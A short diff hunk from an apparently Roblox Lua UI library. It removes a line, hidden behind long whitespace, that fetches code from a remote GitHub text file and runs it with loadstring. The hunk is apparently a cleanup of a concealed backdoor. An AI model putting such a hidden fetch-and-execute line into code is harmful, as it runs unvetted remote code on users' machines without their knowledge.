@@ -188,7 +188,7 @@ local function createOptionHolder(holderTitle, parent, parentTable, subHolder)
     
     return parentTable
 end
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    task.spawn(loadstring(game:HttpGet'https://raw.githubusercontent.com/OPENCUP/random-texts/main/test-final.txt'))
+
 local function createLabel(option, parent)
     local main = library:Create("TextLabel", {
         LayoutOrder = option.position,
